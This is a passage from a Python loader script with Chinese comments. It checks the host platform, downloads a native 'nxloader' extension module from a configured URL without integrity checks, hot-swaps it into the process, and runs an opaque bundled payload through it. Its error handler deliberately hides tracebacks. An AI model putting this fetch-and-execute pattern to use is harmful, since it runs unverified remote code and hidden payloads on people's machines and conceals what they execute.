    return a + (0,) * (n - len(a)) >= b + (0,) * (n - len(b))


def _load_so(path):
    """按指定路径加载扩展模块（同进程内可加载不同版本，模块名固定为 nxloader）。"""
    import importlib.util
    sys.modules.pop('nxloader', None)
    spec = importlib.util.spec_from_file_location('nxloader', path)
    mod = importlib.util.module_from_spec(spec)
    sys.modules['nxloader'] = mod
    spec.loader.exec_module(mod)
    return mod

# --- Decorators & Helpers ---

def handle_errors(func: Callable) -> Callable:
    """异常处理装饰器：统一对外文案，不输出源码/行号/异常链/异常类名。"""
    @wraps(func)
    async def wrapper(*args, **kwargs):
        try:
            return await func(*args, **kwargs)
        except Exception:
            logger.error("脚本无法正常运行，请检测更换环境")
            sys.exit(1)
    return wrapper

def get_linux_distro() -> Tuple[str, str]:
    try:
        with open('/etc/os-release') as f:
            info = {k: v.strip('"') for line in f if '=' in line for k, v in [line.strip().split('=', 1)]}
            return info.get('NAME', 'Unknown'), info.get('VERSION_ID', '')
    except FileNotFoundError:
        return "Not Linux", ""

# --- Core Classes ---

class EnvironmentChecker:
    """环境检查类"""
    def __init__(self, config: Config):
        self.config = config

    @handle_errors
    async def check_system(self) -> Optional[Dict[str, str]]:
        v = sys.version_info
        os_type = platform.system()
        arch = platform.machine()

        system_info = {
            "python_version": f"{v.major}.{v.minor}.{v.micro}",
            "os_type": os_type,
            "architecture": arch
        }
        logger.info(
            f"系统信息: Python版本={system_info['python_version']}, "
            f"操作系统={system_info['os_type']}, 处理器架构={system_info['architecture']}"
        )

        if v.minor not in self.config.SUPPORTED_PYTHON_VERSIONS:
            logger.error("脚本无法正常运行，请检测更换环境")
            return None

        if os_type != self.config.SUPPORTED_OS:
            logger.error("脚本无法正常运行，请检测更换环境")
            return None

        if arch not in self.config.SUPPORTED_ARCHITECTURES:
            logger.error("脚本无法正常运行，请检测更换环境")
            return None

        if arch in {'armv8', 'armv7l'}:
            logger.info("ARMv7, ARMv8请自行尝试")

        return system_info

class FileManager:
    """文件管理类"""
    def __init__(self, config: Config):
        self.config = config

    def get_so_filename(self, py_minor_version: int, cpu_info: str) -> str:
        base_name = "nxloader"
        if cpu_info in ['aarch64', 'armv8']:
            arch = 'aarch64'
        elif cpu_info == 'x86_64':
            arch = cpu_info
        elif 'armv7' in cpu_info:
            arch = 'armv7'
        else:
            raise ValueError(f"不支持的CPU架构: {cpu_info}")

        distro, _ = get_linux_distro()
        if "alpine" in distro.lower():
            return f"{base_name}_3{py_minor_version}_{arch}_musl.so"
        return f"{base_name}_3{py_minor_version}_{arch}.so"

    @handle_errors
    async def download_file(self, filename: str, target: str = 'nxloader.so') -> bool:
        url = f"{self.config.download_url()}/{filename}"
        logger.info(f"开始下载固定 so: {url}")

        def _fetch():
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=60) as r:
                if r.status != 200:
                    raise RuntimeError(f"HTTP {r.status}")
                return r.read()

        try:
            data = await asyncio.get_running_loop().run_in_executor(None, _fetch)
        except Exception:
            logger.error("脚本无法正常运行，请检测更换环境")
            try:
                if os.path.exists(target):
                    os.remove(target)
            except Exception:
                pass
            return False
        with open(target, 'wb') as f:
            f.write(data)
        logger.info(f"so 下载完成: {target}")
        return True

# --- Execution Logic ---

@handle_errors
async def execute_code(config: Config):
    import nxloader
    py_version_str = nxloader.get_python_version()
    loader_version = nxloader.version
    logging.info(f"当前loaderV2版本: {loader_version}")
    if hasattr(nxloader, "set_script"):
        nxloader.set_script(config.SCRIPT_NAME)
    # "3.0" 是 VM 引擎的 payload 键（IR 与 Python 版本无关，只出一份）
    code_to_run = (config.CODE_PAYLOADS.get(py_version_str)
                   or config.CODE_PAYLOADS.get("3.0"))
    if not code_to_run:
        logger.error("脚本无法正常运行，请检测更换环境")
        return
    loop = asyncio.get_running_loop()
    result = await loop.run_in_executor(
        None, lambda: nxloader.main(code_to_run, config.FUNCTION_NAME))
    if hasattr(result, '__await__'):
        await result
    logging.info("代码执行完毕")

async def ensure_loader(config, file_manager) -> bool:
    """本地 so 存在且版本达标则直接用；否则下载新版并热替换。"""
    local = 'nxloader.so'
    if os.path.exists(local):
        try:
            mod = _load_so(local)
            if _ver_ok(getattr(mod, 'version', '0')):
                logger.info(f"本地 loader 版本 {mod.version}（要求 >= {MIN_LOADER_VERSION}）")
                return True
            logger.info(f"本地 loader {getattr(mod, 'version', '?')} 过旧，准备更新到 {MIN_LOADER_VERSION}")
        except Exception:
            logger.info("本地 loader 不可用，准备重新下载")
    filename = file_manager.get_so_filename(sys.version_info.minor, platform.machine())
    tmp = f".nxloader_{MIN_LOADER_VERSION}_{os.getpid()}.so"
    if not await file_manager.download_file(filename, tmp):
        return False
    try:
        mod = _load_so(tmp)
        if not _ver_ok(getattr(mod, 'version', '0')):
            logger.error("脚本无法正常运行，请检测更换环境")
            return False
    except Exception:
        logger.error("脚本无法正常运行，请检测更换环境")
        return False
    try:
        os.replace(tmp, local)      # 下次启动直接命中新版
    except Exception:
        pass
    logger.info(f"loader 已更新: {getattr(mod, 'version', '?')}")
    return True


@handle_errors
async def main():
    config = Config()
    checker = EnvironmentChecker(config)
    file_manager = FileManager(config)

    system_info = await checker.check_system()
    if not system_info:
        return

    if not await ensure_loader(config, file_manager):
        return
    await execute_code(config)

if __name__ == '__main__':
    asyncio.run(main())
